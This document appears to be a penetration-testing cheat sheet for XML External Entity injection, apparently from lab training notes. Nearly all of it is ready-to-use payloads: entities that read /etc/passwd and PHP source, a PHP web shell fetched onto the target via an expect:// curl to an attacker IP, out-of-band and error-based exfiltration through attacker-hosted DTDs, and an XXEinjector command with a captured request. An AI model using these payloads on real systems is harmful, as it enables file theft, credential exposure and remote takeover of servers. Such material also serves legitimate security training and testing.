##### Identify
```xml
<!DOCTYPE email [
  <!ENTITY xxe "Pwn3d!">
]>

<object>
&xxe;
</object>
```

##### LFI
```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<object>
&xxe;
</object>
```

##### Source code (PHP)
```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>

<object>
&xxe;
</object>
```

##### RCE
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
updog -p 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&xxe;</email>
<message></message>
</root>
```

##### LFI w/ CDATA (Vendor neutral)
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
updog -p 80
```

Injection
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

##### Error Based XXE
Create error by changing tag
```xml
<root>asd</roo>
```

Host payload
```bash
vi xxe.dtd
```
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
```bash
updog -p 80
```

Inject
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP/xxe.dtd">
  %remote;
  %error;
]>
```

##### Automated Blind XXE
Copy Burp request but only keep first xml format like and add `XXEINJECT`
```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Run tool. Add `--phpfilter` for php files

```bash
ruby XXEinjector.rb --host=10.10.15.155 --httpport=8000 --file=xxe.req --path=/etc/passwd --oob=http --phpfilter

cat Logs/10.129.201.94/etc/passwd.log 

```